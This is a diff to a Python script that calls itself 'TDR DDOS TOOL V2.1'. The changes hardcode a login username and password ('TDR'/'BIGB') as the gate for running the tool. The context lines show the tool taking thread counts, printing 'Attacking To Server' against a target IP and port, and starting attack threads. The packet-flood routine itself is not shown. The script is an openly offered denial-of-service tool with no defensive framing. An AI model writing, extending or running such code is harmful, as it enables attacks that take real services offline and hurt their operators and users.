@@ -36,6 +36,8 @@ DEVELOPED BY : TDR ARNOLD.
 Tool Version: TDR DDOS TOOL V2.1
 
 Tdr Arnold""")
+hell="TDR"
+boy="BIGB"
 print("Lets start? (yes)")
 choice=str(input("┗━>\033[0m:"))
 if choice=="yes" or choice=="y":
@@ -57,11 +59,13 @@ if choice=="yes" or choice=="y":
     print("\033[31m━━━ Min Threads 110")
     threads = int(input("┗━>\033[0m:"))
   elif opt==1:
+    hellhfgh="TDR"
+    boyusfs="BIGB"
     print("\033[31m━━━ Enter username")
     user = input("┗━>\033[0m:")
     print("\033[31m━━━ Enter password")
     pswd = input("┗━>:")
-    if user == u and pswd==p:
+    if user ==hell and pswd==boy:
       print("\033[31m━━━ Login succesfull")
       time.sleep(1)
       print("\033[31m━━━ Loading....10%")
@@ -85,11 +89,13 @@ if choice=="yes" or choice=="y":
     else:
       print("\033[31m━━━ Incorrect username or password")
   elif opt==2:
+    hell000 = "TDR"
+    boyjnj="BIGB"
     print("\033[31m━━━ Enter username")
     user = input("┗━>\033[0m:")
     print("\033[31m━━━ Enter password")
     pswd = input("┗━>:")
-    if user == u and pswd==p:
+    if user==hell and pswd==boy:
       print("\033[31m━━━ Login succesfull")
       time.sleep(1)
       print("\033[31m━━━ Loading....10%")
@@ -180,7 +186,7 @@ if choice=="yes" or choice=="y":
             print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
       except:
         print("[!] Server Attack")
-  if user==u and pswd==p:
+  if user==hell and pswd==boy:
     for y in range(threads):
       if choice == 'yes' or "y":
           th = threading.Thread(target = xxxx)
